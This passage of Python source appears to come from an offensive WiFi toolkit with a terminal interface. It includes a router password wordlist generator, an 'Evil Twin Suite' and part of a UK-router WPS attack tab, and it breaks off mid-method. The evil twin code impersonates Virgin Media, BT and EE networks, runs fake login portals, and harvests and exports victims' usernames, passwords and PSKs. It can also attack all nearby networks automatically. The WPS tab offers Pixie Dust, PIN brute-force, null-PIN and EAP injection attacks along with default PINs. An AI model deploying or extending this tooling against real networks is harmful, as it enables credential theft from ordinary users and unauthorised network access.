            stats_text += f"  Total passwords: {len(wordlist):,}\n"
            stats_text += f"  Pattern type: {pattern_desc}\n"
            stats_text += f"  Target SSID: {ssid}\n"
            stats_text += f"  Average length: {sum(len(p) for p in wordlist[:100]) // min(100, len(wordlist)):.1f} chars"

            stats_display.update(stats_text)

            log.write(f"[green]✓ Generated {len(wordlist):,} passwords using {pattern_desc}[/]")
            log.write("[cyan]Preview updated - use 'Save Wordlist' to export[/]")

            # Store wordlist for saving
            self._current_wordlist = wordlist
            self._current_pattern = pattern_desc

        except Exception as e:
            log.write(f"[red]Wordlist generation failed: {e}[/]")
            preview_display.update("[red]Generation failed[/]")
            stats_display.update("[red]No statistics available[/]")

    def save_router_wordlist(self):
        """Save the currently generated wordlist"""
        log = self.query_one("#router_log", MarkupLog)

        if not hasattr(self, '_current_wordlist') or not self._current_wordlist:
            log.write("[red]Error: No wordlist generated yet. Use 'Generate Wordlist' first.[/]")
            return

        try:
            ssid_input = self.query_one("#router_ssid", Input)
            ssid = ssid_input.value.strip() or "router"

            # Create safe filename
            safe_ssid = ssid.replace("-", "_").replace(" ", "_").replace("/", "_")
            pattern_name = getattr(self, '_current_pattern', 'unknown').replace(" ", "_").replace("(", "").replace(")", "").lower()
            filename = f"router_{pattern_name}_{safe_ssid}.txt"
            filepath = ROOT_DIR / filename

            with open(filepath, 'w') as f:
                f.write('\n'.join(self._current_wordlist))

            log.write(f"[green]✓ Wordlist saved: {filepath} ({len(self._current_wordlist):,} passwords)[/]")
            log.write("[cyan]Ready to use with WiFi cracking![/]")

        except Exception as e:
            log.write(f"[red]Failed to save wordlist: {e}[/]")



class EvilTwinSuiteTab(Container):
    """Evil Twin Suite Interface - Full Implementation"""

    def __init__(self):
        super().__init__(id="evil_twin_container")
        self.evil_twin_suite = None
        self.active_aps = {}

    def compose(self):
        """Compose the evil twin suite interface"""
        yield Label("[bold white]Evil Twin Suite[/]")
        yield Label("[cyan]Create realistic fake access points to capture credentials[/]")

        # Help text
        yield Label("[dim]⚠️  Requires: hostapd, dnsmasq, iptables. Use 'sudo ./bootstrap_evil_twin.sh'[/]")
        yield Label("[dim]💡 Select target network → Choose ISP template → Launch attack → Monitor credentials[/]")

        # Network Interface Selection
        with Vertical():
            yield Label("[yellow]📡 Network Interface:[/]")

            with Horizontal():
                yield Input(placeholder="wlan0", value="wlan0",
                           id="evil_interface_input", classes="input-field")
                yield Button("🔍 Scan Networks", id="scan_networks", variant="primary",
                           tooltip="Scan for nearby WiFi networks")
                yield Button("⚙️ Check Interface", id="check_interface", variant="warning",
                           tooltip="Verify interface supports AP mode")

            yield Static("", id="interface_status", classes="info-display")

        # Target Network Selection
        with Vertical():
            yield Label("[yellow]🎯 Target Network:[/]")

            with Horizontal():
                yield Input(placeholder="BTWifi-1234, VM-ABC123, EE-BrightBox-XYZ",
                           id="target_ssid_input", classes="input-field")
                yield Button("🔎 Auto-Detect ISP", id="auto_detect_isp", variant="primary",
                           tooltip="Automatically detect ISP from SSID")
                yield Button("📋 Select from Scan", id="select_from_scan", variant="warning",
                           tooltip="Choose from scanned networks")

            yield Static("", id="detected_isp", classes="info-display")

        # Evil Twin Configuration
        with Vertical():
            yield Label("[yellow]⚙️ Evil Twin Configuration:[/]")

            with Horizontal():
                with RadioSet(id="isp_selector"):
                    yield RadioButton("🔴 Virgin Media", "virgin_media")
                    yield RadioButton("🔵 BT", "bt")
                    yield RadioButton("🟡 EE", "ee")
                    yield RadioButton("🎯 Auto", "auto")

                yield Input(placeholder="Channel (1-13)", value="6",
                           id="channel_input", classes="input-field")

        # Attack Options
        with Vertical():
            yield Label("[yellow]🎯 Attack Options:[/]")

            with Horizontal():
                yield Switch(id="captive_portal_switch", value=True)
                yield Label("Enable Captive Portal")

                yield Switch(id="dhcp_switch", value=True)
                yield Label("Enable DHCP")

                yield Switch(id="deauth_switch", value=False)
                yield Label("Deauthentication")

                yield Switch(id="wps_switch", value=True)
                yield Label("Enable WPS")

        # Evil Twin Controls
        with Vertical():
            yield Label("[yellow]🚀 Evil Twin Controls:[/]")

            with Horizontal():
                yield Button("🦹 Start Evil Twin", id="start_evil_twin", variant="error",
                           tooltip="Create and start evil twin AP")
                yield Button("🛑 Stop Evil Twin", id="stop_evil_twin", variant="warning",
                           tooltip="Stop evil twin AP")
                yield Button("🔄 Auto Attack All", id="auto_attack_all", variant="success",
                           tooltip="Automatically create evil twins for all detected networks")
                yield Button("📊 Show Status", id="show_status", variant="primary",
                           tooltip="Show current evil twin status")

        # Active APs Display
        with Vertical():
            yield Label("[yellow]📡 Active Evil Twins:[/]")
            yield DataTable(id="active_aps_table")

        # Captured Credentials
        with Vertical():
            yield Label("[yellow]🔑 Captured Credentials:[/]")
            yield DataTable(id="credentials_table")
            yield Button("💾 Export Credentials", id="export_credentials", variant="success")

        # Log output
        yield MarkupLog(id="evil_twin_log", classes="log-area")

    def on_mount(self):
        """Initialize the evil twin suite"""
        log = self.query_one("#evil_twin_log", MarkupLog)
        log.write("[cyan]🦹 Evil Twin Suite Ready - Create realistic fake APs[/]")
        log.write("[yellow]⚠️  Use only for authorized security testing[/]")

        # Initialize tables
        aps_table = self.query_one("#active_aps_table", DataTable)
        aps_table.add_columns("Interface", "SSID", "Channel", "Running", "Credentials")

        creds_table = self.query_one("#credentials_table", DataTable)
        creds_table.add_columns("Time", "Client MAC", "Username", "Password", "Type")

        # Initialize evil twin suite
        try:
            from .crackers.evil_twin_suite import EvilTwinSuite
            self.evil_twin_suite = EvilTwinSuite()
            log.write("[green]✅ Evil Twin Suite initialized[/]")
        except ImportError as e:
            log.write(f"[red]❌ Failed to initialize Evil Twin Suite: {e}[/]")

    @on(Button.Pressed, "#check_interface")
    def check_interface(self, event):
        """Check if interface supports AP mode"""
        log = self.query_one("#evil_twin_log", MarkupLog)
        interface_input = self.query_one("#evil_interface_input", Input)

        interface = interface_input.value.strip()
        if not interface:
            log.write("[red]❌ Please enter interface name[/]")
            return

        log.write(f"[cyan]🔍 Checking interface: {interface}[/]")

        try:
            # Check if interface exists
            import netifaces
            if interface not in netifaces.interfaces():
                log.write(f"[red]❌ Interface {interface} does not exist[/]")
                self.query_one("#interface_status", Static).update("❌ Interface not found")
                return

            # Check AP mode support
            result = subprocess.run(
                ["iw", "list"],
                capture_output=True,
                text=True,
                timeout=10
            )

            if "AP" in result.stdout:
                log.write(f"[green]✅ Interface {interface} supports AP mode[/]")
                self.query_one("#interface_status", Static).update("✅ AP mode supported")
            else:
                log.write(f"[yellow]⚠️ Interface {interface} may not support AP mode[/]")
                self.query_one("#interface_status", Static).update("⚠️ AP mode not detected")

            # Check required tools
            tools_check = self._check_required_tools()
            if tools_check:
                log.write("[green]✅ All required tools available[/]")
            else:
                log.write("[red]❌ Some required tools missing[/]")

        except Exception as e:
            log.write(f"[red]❌ Interface check failed: {e}[/]")

    def _check_required_tools(self) -> bool:
        """Check if all required tools are available"""
        required_tools = ["hostapd", "dnsmasq", "iw", "airmon-ng"]
        missing_tools = []

        for tool in required_tools:
            try:
                result = subprocess.run(
                    ["which", tool],
                    capture_output=True,
                    timeout=5
                )
                if result.returncode != 0:
                    missing_tools.append(tool)
            except Exception:
                missing_tools.append(tool)

        if missing_tools:
            log = self.query_one("#evil_twin_log", MarkupLog)
            log.write(f"[yellow]⚠️ Missing tools: {', '.join(missing_tools)}[/]")
            return False

        return True

    @on(Button.Pressed, "#scan_networks")
    def scan_networks(self, event):
        """Scan for nearby WiFi networks"""
        log = self.query_one("#evil_twin_log", MarkupLog)
        interface_input = self.query_one("#evil_interface_input", Input)

        interface = interface_input.value.strip()
        if not interface:
            log.write("[red]❌ Please enter interface name[/]")
            return

        log.write(f"[cyan]🔍 Scanning networks on {interface}...[/]")

        try:
            # Put interface into monitor mode temporarily
            subprocess.run(["ifconfig", interface, "down"], check=False)
            subprocess.run(["iwconfig", interface, "mode", "monitor"], check=False)
            subprocess.run(["ifconfig", interface, "up"], check=False)

            # Scan for networks
            result = subprocess.run(
                ["iw", "dev", interface, "scan"],
                capture_output=True,
                text=True,
                timeout=15
            )

            # Parse results
            networks = self._parse_scan_results(result.stdout)
            log.write(f"[green]✅ Found {len(networks)} networks[/]")

            for i, net in enumerate(networks[:10], 1):  # Show first 10
                ssid = net.get('ssid', 'Hidden')
                bssid = net.get('bssid', 'Unknown')
                channel = net.get('channel', 'Unknown')
                signal = net.get('signal', 'Unknown')

                log.write(f"[cyan]  {i}. {ssid} ({bssid}) - Ch:{channel}, Signal:{signal}dBm[/]")

            # Store scan results for selection
            self._scan_results = networks
            log.write("[cyan]💡 Use 'Select from Scan' to choose a target[/]")

            # Restore managed mode
            subprocess.run(["ifconfig", interface, "down"], check=False)
            subprocess.run(["iwconfig", interface, "mode", "managed"], check=False)
            subprocess.run(["ifconfig", interface, "up"], check=False)

        except Exception as e:
            log.write(f"[red]❌ Network scan failed: {e}[/]")

    def _parse_scan_results(self, output: str) -> List[Dict]:
        """Parse iw scan output"""
        networks = []
        current_network = {}

        for line in output.split('\n'):
            line = line.strip()

            if line.startswith('BSS '):
                if current_network:
                    networks.append(current_network)
                current_network = {'bssid': line.split()[1].split('(')[0]}

            elif line.startswith('SSID:') and current_network:
                current_network['ssid'] = line.split(':', 1)[1].strip()

            elif line.startswith('signal:') and current_network:
                try:
                    signal = float(line.split(':')[1].split()[0])
                    current_network['signal'] = signal
                except ValueError:
                    pass

            elif 'primary channel:' in line and current_network:
                try:
                    channel = int(line.split(':')[1].strip())
                    current_network['channel'] = channel
                except ValueError:
                    pass

        if current_network:
            networks.append(current_network)

        return networks

    @on(Button.Pressed, "#auto_detect_isp")
    def auto_detect_isp(self, event):
        """Auto-detect ISP from SSID"""
        log = self.query_one("#evil_twin_log", MarkupLog)
        ssid_input = self.query_one("#target_ssid_input", Input)

        ssid = ssid_input.value.strip()
        if not ssid:
            log.write("[red]❌ Please enter target SSID[/]")
            return

        log.write(f"[cyan]🔎 Detecting ISP for: {ssid}[/]")

        try:
            from .crackers.evil_twin_suite import UKISPTemplates

            isp = UKISPTemplates.detect_isp_from_ssid(ssid)

            if isp:
                log.write(f"[green]✅ Detected ISP: {isp.value.upper()}[/]")

                # Update ISP selector
                isp_selector = self.query_one("#isp_selector", RadioSet)
                isp_selector.value = isp.value

                # Update display
                self.query_one("#detected_isp", Static).update(f"Detected: {isp.value.upper()}")

                # Suggest evil twin SSID
                evil_ssid = self._suggest_evil_ssid(ssid, isp)
                log.write(f"[cyan]💡 Suggested evil twin SSID: {evil_ssid}[/]")

            else:
                log.write("[yellow]⚠️ ISP not detected, will use generic template[/]")
                self.query_one("#detected_isp", Static).update("Not detected - using generic")

        except Exception as e:
            log.write(f"[red]❌ ISP detection failed: {e}[/]")

    def _suggest_evil_ssid(self, original_ssid: str, isp) -> str:
        """Suggest evil twin SSID based on original"""
        if isp.value == "virgin_media":
            return f"{original_ssid}_EXT"
        elif isp.value == "bt":
            return f"{original_ssid} Plus"
        elif isp.value == "ee":
            return f"{original_ssid} Guest"
        else:
            return f"{original_ssid}_FREE"

    @on(Button.Pressed, "#start_evil_twin")
    async def start_evil_twin(self, event):
        """Start evil twin AP"""
        log = self.query_one("#evil_twin_log", MarkupLog)

        # Get configuration
        interface = self.query_one("#evil_interface_input", Input).value.strip()
        target_ssid = self.query_one("#target_ssid_input", Input).value.strip()
        isp_selector = self.query_one("#isp_selector", RadioSet)
        channel_input = self.query_one("#channel_input", Input)

        if not interface or not target_ssid:
            log.write("[red]❌ Please specify interface and target SSID[/]")
            return

        # Show confirmation dialog for destructive operation
        confirmed = await self.app.confirm_destructive_operation(
            "Evil Twin Attack",
            f"This will create a fake WiFi network '{target_ssid}' to capture user credentials.",
            [
                f"Create rogue access point on interface {interface}",
                "Redirect users to fake login portal",
                "Capture and store user credentials",
                "Potentially disrupt legitimate network access",
                "May violate local laws - ensure you have permission"
            ]
        )

        if not confirmed:
            log.write("[yellow]🛑 Evil twin attack cancelled by user[/]")
            return

        try:
            channel = int(channel_input.value.strip())
        except ValueError:
            channel = 6

        # Get ISP
        isp_value = isp_selector.value
        if isp_value == "auto":
            from .crackers.evil_twin_suite import UKISPTemplates
            isp_enum = UKISPTemplates.detect_isp_from_ssid(target_ssid)
            if not isp_enum:
                isp_enum = UKISP.VIRGIN_MEDIA  # Default
        else:
            isp_enum = UKISP(isp_value)

        # Get attack options
        captive_portal = self.query_one("#captive_portal_switch", Switch).value
        dhcp_enabled = self.query_one("#dhcp_switch", Switch).value
        deauth_enabled = self.query_one("#deauth_switch", Switch).value
        wps_enabled = self.query_one("#wps_switch", Switch).value

        log.write(f"[red]🦹 STARTING EVIL TWIN AP[/]")
        log.write(f"[cyan]Interface: {interface}[/]")
        log.write(f"[cyan]Target SSID: {target_ssid}[/]")
        log.write(f"[cyan]ISP Template: {isp_enum.value.upper()}[/]")
        log.write(f"[cyan]Channel: {channel}[/]")

        try:
            # Create evil twin
            ap = self.evil_twin_suite.create_evil_twin(
                isp=isp_enum,
                target_ssid=target_ssid,
                interface=interface,
                channel=channel,
                enable_captive_portal=captive_portal,
                dhcp_enabled=dhcp_enabled,
                wps_enabled=wps_enabled
            )

            if ap:
                self.active_aps[interface] = ap
                log.write(f"[green]✅ Evil twin AP started successfully![/]")
                log.write(f"[cyan]📡 Broadcasting as: {target_ssid}[/]")

                if captive_portal:
                    log.write("[cyan]🌐 Captive portal enabled[/]")
                if dhcp_enabled:
                    log.write("[cyan]📡 DHCP server enabled[/]")
                if wps_enabled:
                    log.write("[cyan]🔐 WPS enabled[/]")

                # Update status table
                self._update_status_table()

            else:
                log.write("[red]❌ Failed to start evil twin AP[/]")

        except Exception as e:
            log.write(f"[red]❌ Evil twin creation failed: {e}[/]")

    @on(Button.Pressed, "#stop_evil_twin")
    def stop_evil_twin(self, event):
        """Stop evil twin AP"""
        log = self.query_one("#evil_twin_log", MarkupLog)
        interface_input = self.query_one("#evil_interface_input", Input)

        interface = interface_input.value.strip()

        if interface in self.active_aps:
            try:
                self.evil_twin_suite.stop_evil_twin(interface)
                del self.active_aps[interface]
                log.write(f"[green]✅ Evil twin AP stopped: {interface}[/]")
                self._update_status_table()
            except Exception as e:
                log.write(f"[red]❌ Failed to stop evil twin: {e}[/]")
        else:
            log.write(f"[yellow]⚠️ No active evil twin on {interface}[/]")

    @on(Button.Pressed, "#auto_attack_all")
    def auto_attack_all(self, event):
        """Automatically create evil twins for all detected networks"""
        log = self.query_one("#evil_twin_log", MarkupLog)
        interface_input = self.query_one("#evil_interface_input", Input)

        interface = interface_input.value.strip()
        if not interface:
            log.write("[red]❌ Please specify interface[/]")
            return

        if not hasattr(self, '_scan_results'):
            log.write("[red]❌ Please scan networks first[/]")
            return

        log.write("[red]🚀 STARTING AUTO EVIL TWIN ATTACK[/]")
        log.write(f"[yellow]⚠️ This will create evil twins for ALL detected networks[/]")

        try:
            created_aps = self.evil_twin_suite.auto_detect_and_attack(interface)

            if created_aps:
                log.write(f"[green]✅ Created {len(created_aps)} evil twin APs![/]")

                for ap in created_aps:
                    self.active_aps[ap.config.interface] = ap
                    log.write(f"[cyan]📡 {ap.config.target_ssid} (Ch:{ap.config.channel})[/]")

                self._update_status_table()
            else:
                log.write("[yellow]⚠️ No suitable networks found for evil twin attacks[/]")

        except Exception as e:
            log.write(f"[red]❌ Auto attack failed: {e}[/]")

    @on(Button.Pressed, "#show_status")
    def show_status(self, event):
        """Show current evil twin status"""
        log = self.query_one("#evil_twin_log", MarkupLog)

        log.write("[cyan]📊 Evil Twin Status Report[/]")

        if not self.active_aps:
            log.write("[yellow]⚠️ No active evil twin APs[/]")
            return

        total_credentials = 0

        for interface, ap in self.active_aps.items():
            status = ap.get_status()
            credentials = len(ap.get_captured_credentials())

            log.write(f"[green]📡 {interface}:[/]")
            log.write(f"   SSID: {status['ssid']}[/]")
            log.write(f"   Channel: {status['channel']}[/]")
            log.write(f"   Running: {'✅' if status['running'] else '❌'}[/]")
            log.write(f"   Captive Portal: {'✅' if status['captive_portal'] else '❌'}[/]")
            log.write(f"   DHCP: {'✅' if status['dhcp_enabled'] else '❌'}[/]")
            log.write(f"   Credentials: {credentials}[/]")

            total_credentials += credentials

        log.write(f"[cyan]📋 Total Credentials Captured: {total_credentials}[/]")

        # Update credentials table
        self._update_credentials_table()

    @on(Button.Pressed, "#export_credentials")
    def export_credentials(self, event):
        """Export captured credentials"""
        log = self.query_one("#evil_twin_log", MarkupLog)

        if not self.active_aps:
            log.write("[red]❌ No active evil twins to export from[/]")
            return

        try:
            from pathlib import Path
            import json

            export_data = {
                "export_time": time.time(),
                "evil_twins": {}
            }

            total_credentials = 0

            for interface, ap in self.active_aps.items():
                credentials = ap.get_captured_credentials()
                export_data["evil_twins"][interface] = {
                    "ssid": ap.config.target_ssid,
                    "credentials": [
                        {
                            "timestamp": cred.timestamp,
                            "client_mac": cred.client_mac,
                            "username": cred.username,
                            "password": cred.password,
                            "psk": cred.psk,
                            "auth_type": cred.authentication_type
                        }
                        for cred in credentials
                    ]
                }
                total_credentials += len(credentials)

            # Save to file
            export_file = Path.cwd() / f"evil_twin_credentials_{int(time.time())}.json"
            with open(export_file, 'w') as f:
                json.dump(export_data, f, indent=2)

            log.write(f"[green]✅ Exported {total_credentials} credentials to {export_file}[/]")

        except Exception as e:
            log.write(f"[red]❌ Credential export failed: {e}[/]")

    def _update_status_table(self):
        """Update the active APs status table"""
        table = self.query_one("#active_aps_table", DataTable)
        table.clear()

        for interface, ap in self.active_aps.items():
            status = ap.get_status()
            credentials = len(ap.get_captured_credentials())

            table.add_row(
                interface,
                status['ssid'],
                status['channel'],
                "✅ Running" if status['running'] else "❌ Stopped",
                str(credentials)
            )

    def _update_credentials_table(self):
        """Update the credentials table"""
        table = self.query_one("#credentials_table", DataTable)
        table.clear()

        for ap in self.active_aps.values():
            credentials = ap.get_captured_credentials()

            for cred in credentials[-50:]:  # Show last 50
                timestamp = time.strftime("%H:%M:%S", time.localtime(cred.timestamp))
                table.add_row(
                    timestamp,
                    cred.client_mac,
                    cred.username or "N/A",
                    cred.password or "N/A",
                    cred.authentication_type
                )


class UKRouterWPSTab(Container):
    """UK Router WPS Attack Interface - Full Implementation"""

    def __init__(self):
        super().__init__(id="uk_wps_container")
        self._current_wordlist = []
        self._attack_results = {}
        self._detected_router = None

    def compose(self):
        """Compose the UK WPS attack interface"""
        yield Label("[bold white]UK Router WPS Attacks[/]")
        yield Label("[cyan]Advanced WPS-based attacks for UK ISPs (Virgin, BT, EE)[/]")

        # Help text
        yield Label("[dim]💡 Start by detecting your router type, then choose appropriate attack methods[/]")

        # Router Detection Section
        with Vertical():
            yield Label("[yellow]🔍 Router Detection & Analysis:[/]")

            with Horizontal():
                yield Input(placeholder="Enter router SSID (e.g., VM1234567, BTHub5A123)",
                           id="ssid_input", classes="input-field")
                yield Button("🔍 Detect Router", id="detect_router", variant="primary")
                yield Button("📊 Analyze SSID", id="analyze_ssid", variant="warning")

            yield Static("", id="router_info", classes="info-display")

        # WPS Attack Methods
        with Vertical():
            yield Label("[yellow]🎯 WPS Attack Methods:[/]")

            with Horizontal():
                yield Button("🔐 Compute PIN", id="compute_pin_attack", variant="primary",
                           tooltip="Generate PINs from router MAC address")
                yield Button("👾 Pixie Dust", id="pixie_dust_attack", variant="error",
                           tooltip="Pixie Dust attack for vulnerable routers")
                yield Button("🔢 PIN Brute Force", id="brute_force_attack", variant="warning",
                           tooltip="Brute force common WPS PIN patterns")
                yield Button("🚫 Null PIN", id="null_pin_attack", variant="success",
                           tooltip="Test null/empty PIN vulnerabilities")

        # Advanced WPS Attack Methods
        with Vertical():
            yield Label("[yellow]🚀 Advanced WPS Attacks:[/]")

            with Horizontal():
                yield Button("🔑 Small DH Key", id="small_dh_attack", variant="error",
                           tooltip="Exploit weak Diffie-Hellman parameters")
                yield Button("📢 Registrar Disclosure", id="registrar_disclosure_attack", variant="warning",
                           tooltip="Force AP to reveal PIN through protocol abuse")
                yield Button("💉 EAP Injection", id="eap_injection_attack", variant="success",
                           tooltip="Inject malicious EAP messages to extract credentials")
                yield Button("🎯 Auto Advanced", id="auto_advanced_attack", variant="primary",
                           tooltip="Automatically try all advanced attacks")

        # UK Provider Specific Attacks
        with Vertical():
            yield Label("[yellow]🇬🇧 UK Provider Attacks:[/]")

            with Horizontal():
                yield Button("🔴 Virgin Media", id="virgin_attack", variant="primary",
                           tooltip="Virgin Media Super Hub WPS attacks")
                yield Button("🔵 BT", id="bt_attack", variant="warning",
                           tooltip="BT Home/Smart Hub WPS attacks")
                yield Button("🟡 EE", id="ee_attack", variant="error",
                           tooltip="EE Bright Box WPS attacks")
                yield Button("🎯 Auto UK Attack", id="auto_uk_attack", variant="success",
                           tooltip="Auto-detect provider and launch optimal attack")

        # Full Pipeline Attack
        with Vertical():
            yield Label("[yellow]🚀 Complete WPS Attack Pipeline:[/]")

            with Horizontal():
                yield Input(placeholder="Wireless interface (wlan0)", value="wlan0",
                           id="interface_input", classes="input-field")
                yield Button("🔍 Scan & Attack All", id="full_pipeline_attack", variant="error",
                           tooltip="Scan for vulnerable routers and attack them all")
                yield Button("📊 Generate Report", id="pipeline_report", variant="warning",
                           tooltip="Generate comprehensive attack report")

        # MAC Address Input for Advanced Attacks
        with Vertical():
            yield Label("[yellow]📡 MAC Address (for advanced attacks):[/]")
            yield Input(placeholder="XX:XX:XX:XX:XX:XX (optional, improves success rate)",
                       id="mac_input", classes="input-field")

        # Attack Results
        with Vertical():
            yield Label("[yellow]📋 Attack Results:[/]")
            yield DataTable(id="wps_results_table")

        # Wordlist Generation
        with Vertical():
            yield Label("[yellow]📝 WPS Wordlist Generation:[/]")

            with Horizontal():
                yield Input(placeholder="Number of PINs (100-5000)", value="1000",
                           id="wps_count_input", classes="input-field")
                yield Button("🔢 Generate WPS PINs", id="generate_wps_pins", variant="primary")
                yield Button("💾 Save Wordlist", id="save_wps_wordlist", variant="success")

            yield Static("", id="wordlist_stats", classes="info-display")

        # Log output
        yield MarkupLog(id="uk_wps_log", classes="log-area")

    def on_mount(self):
        """Initialize the WPS attack interface"""
        log = self.query_one("#uk_wps_log", MarkupLog)
        log.write("[cyan]🔥 UK Router WPS Attack Interface Ready[/]")
        log.write("[cyan]Supports Virgin Media, BT, EE, and other UK providers[/]")
        log.write("[yellow]💡 Tip: Enter router SSID for automatic provider detection[/]")

        # Initialize results table
        table = self.query_one("#wps_results_table", DataTable)
        table.add_columns("Method", "PIN", "Success", "Router Model", "Time")
        table.zebra_stripes = True

    @on(Button.Pressed, "#detect_router")
    def detect_router(self, event):
        """Detect router model from SSID"""
        log = self.query_one("#uk_wps_log", MarkupLog)
        ssid_input = self.query_one("#ssid_input", Input)

        ssid = ssid_input.value.strip()
        if not ssid:
            log.write("[red]❌ Please enter a router SSID[/]")
            return

        log.write(f"[cyan]🔍 Detecting router from SSID: {ssid}[/]")

        try:
            from .crackers.uk_router_wps import UKRouterWPSCracker

            # Create cracker instance
            cracker = UKRouterWPSCracker("", ssid)

            # Detect router
            detected = cracker.detect_router()

            if detected:
                self._detected_router = detected
                info = cracker.get_router_info()

                log.write(f"[green]✅ Detected: {detected.provider.value.upper()} {detected.model}[/]")
                log.write(f"[cyan]🔓 WPS Vulnerabilities: {', '.join(detected.wps_vulnerabilities)}[/]")
                log.write(f"[cyan]🎯 Attack Methods: {', '.join(info.get('attack_methods', []))}[/]")

                # Update router info display
                router_info = self.query_one("#router_info", Static)
                router_info.update(f"""
Provider: {detected.provider.value.upper()}
Model: {detected.model}
Firmware: {', '.join(detected.firmware_versions[:2])}
Vulnerabilities: {', '.join(detected.wps_vulnerabilities)}
Default PINs: {', '.join(detected.default_pins[:3])}
                """.strip())

            else:
                log.write("[yellow]⚠️ Router not recognized in database[/]")
                log.write("[cyan]💡 Try manual attack methods or check SSID format[/]")

        except ImportError:
            log.write("[red]❌ UK WPS module not available[/]")
        except Exception as e:
            log.write(f"[red]❌ Detection failed: {e}[/]")

    @on(Button.Pressed, "#analyze_ssid")
    def analyze_ssid(self, event):
        """Analyze SSID patterns for attack suggestions"""
        log = self.query_one("#uk_wps_log", MarkupLog)
        ssid_input = self.query_one("#ssid_input", Input)

        ssid = ssid_input.value.strip()
        if not ssid:
            log.write("[red]❌ Please enter a router SSID[/]")
            return

        log.write(f"[cyan]📊 Analyzing SSID: {ssid}[/]")

        # SSID pattern analysis
        analysis = self._analyze_ssid_patterns(ssid)

        log.write("[cyan]📋 SSID Analysis Results:[/]")
        for key, value in analysis.items():
            log.write(f"[yellow]  {key}:[/] {value}")

        # Suggest attack methods
        suggestions = self._get_attack_suggestions(analysis)
        if suggestions:
            log.write("[green]🎯 Recommended Attacks:[/]")
            for suggestion in suggestions:
                log.write(f"[cyan]  • {suggestion}[/]")

    def _analyze_ssid_patterns(self, ssid: str) -> Dict[str, str]:
        """Analyze SSID for patterns and characteristics"""
        analysis = {}

        # Provider detection
        ssid_lower = ssid.lower()
        if any(x in ssid_lower for x in ['vm', 'virgin', 'superhub']):
            analysis["Provider"] = "Virgin Media"
        elif any(x in ssid_lower for x in ['bt', 'bthub', 'homehub', 'smarthub']):
            analysis["Provider"] = "BT"
        elif any(x in ssid_lower for x in ['ee', 'brightbox', 'ee-']):
            analysis["Provider"] = "EE"
        elif 'sky' in ssid_lower:
            analysis["Provider"] = "Sky"
        else:
            analysis["Provider"] = "Unknown/Generic"

        # Pattern type
        if any(char.isdigit() for char in ssid):
            if len([c for c in ssid if c.isdigit()]) > 6:
                analysis["Pattern Type"] = "MAC-based (high confidence)"
            else:
                analysis["Pattern Type"] = "Mixed alphanumeric"
        else:
            analysis["Pattern Type"] = "Pure alphanumeric"

        # Length analysis
        length = len(ssid)
        if length < 8:
            analysis["Length"] = "Short (<8 chars - may be custom)"
        elif length <= 12:
            analysis["Length"] = "Normal (8-12 chars - typical router)"
        else:
            analysis["Length"] = "Long (>12 chars - may include MAC)"

        # Security indicators
        if 'wpa' in ssid_lower or 'wps' in ssid_lower:
            analysis["Security Hints"] = "May indicate WPS enabled"
        else:
            analysis["Security Hints"] = "Standard security expected"

        return analysis

    def _get_attack_suggestions(self, analysis: Dict[str, str]) -> List[str]:
        """Get attack suggestions based on SSID analysis"""
        suggestions = []

        provider = analysis.get("Provider", "").lower()

        if "virgin" in provider:
            suggestions.extend([
                "Compute PIN attack (high success rate)",
                "Pixie Dust attack (Super Hub 2/3/4/5)",
                "Default PIN patterns (12345670, 88471112)"
            ])
        elif "bt" in provider:
            suggestions.extend([
                "Compute PIN attack (Home Hub 5/6)",
                "Pixie Dust attack (Smart Hub 2)",
                "Null PIN attack (some models)"
            ])
        elif "ee" in provider:
            suggestions.extend([
                "Compute PIN attack (Bright Box routers)",
                "Pixie Dust attack (Smart Hub)",
                "EE-specific PIN patterns"
            ])
        else:
            suggestions.extend([
                "PIN brute force (all routers)",
                "Compute PIN from MAC (if available)",
                "Common WPS PIN patterns"
            ])

        return suggestions

    @on(Button.Pressed, "#compute_pin_attack")
    def compute_pin_attack(self, event):
        """Launch compute PIN attack"""
        self._launch_wps_attack("compute_pin")

    @on(Button.Pressed, "#pixie_dust_attack")
    def pixie_dust_attack(self, event):
        """Launch Pixie Dust attack"""
        self._launch_wps_attack("pixie_dust")

    @on(Button.Pressed, "#brute_force_attack")
    def brute_force_attack(self, event):
        """Launch PIN brute force attack"""
        self._launch_wps_attack("brute_force")

    @on(Button.Pressed, "#null_pin_attack")
    def null_pin_attack(self, event):
        """Launch null PIN attack"""
        self._launch_wps_attack("null_pin")

    def _launch_wps_attack(self, method: str):
        """Launch WPS attack with specified method"""
        log = self.query_one("#uk_wps_log", MarkupLog)
        ssid_input = self.query_one("#ssid_input", Input)
        mac_input = self.query_one("#mac_input", Input)

        ssid = ssid_input.value.strip()
        mac = mac_input.value.strip()

        if not ssid:
            log.write("[red]❌ Please enter router SSID[/]")
            return

        log.write(f"[cyan]🎯 Launching {method.replace('_', ' ').title()} attack on: {ssid}[/]")

        if mac:
            log.write(f"[cyan]📡 Using MAC address: {mac}[/]")

        try:
            from .crackers.uk_router_wps import UKRouterWPSCracker, WPSAttackMethod

            # Map method string to enum
            method_map = {
                "compute_pin": WPSAttackMethod.COMPUTE_PIN,
                "pixie_dust": WPSAttackMethod.PIXIE_DUST,
                "brute_force": WPSAttackMethod.PIN_BRUTE_FORCE,
                "null_pin": WPSAttackMethod.NULL_PIN
            }

            attack_method = method_map.get(method, WPSAttackMethod.PIN_BRUTE_FORCE)

            # Create cracker
            cracker = UKRouterWPSCracker(mac, ssid)

            # Attempt to crack PIN
            result = cracker.crack_wps_pin(timeout=60)  # 60 second timeout

            if result:
                log.write(f"[green]✅ SUCCESS! Found PIN: {result.pin}[/]")
                log.write(f"[cyan]🎯 Method: {result.method.value}[/]")
                log.write(f"[cyan]⏱️  Time: {result.execution_time:.2f}s[/]")
                if result.router_model:
                    log.write(f"[cyan]📱 Router: {result.router_model}[/]")

                # Add to results table
                table = self.query_one("#wps_results_table", DataTable)
                table.add_row(
                    result.method.value,
                    result.pin,
                    "✅ SUCCESS",
                    result.router_model or "Unknown",
                    ".2f"
                )

                # Store result
                self._attack_results[method] = result

            else:
                log.write("[yellow]⚠️ Attack completed - no PIN found[/]")
                log.write("[cyan]💡 Try different attack method or check router compatibility[/]")

                # Add failed attempt to table
                table = self.query_one("#wps_results_table", DataTable)
                table.add_row(
                    method.replace('_', ' ').title(),
                    "N/A",
                    "❌ FAILED",
                    self._detected_router.model if self._detected_router else "Unknown",
                    "60.00"
                )

        except ImportError:
            log.write("[red]❌ UK WPS module not available[/]")
        except Exception as e:
            log.write(f"[red]❌ Attack failed: {e}[/]")

    @on(Button.Pressed, "#virgin_attack")
    def virgin_attack(self, event):
        """Launch Virgin Media specific attack"""
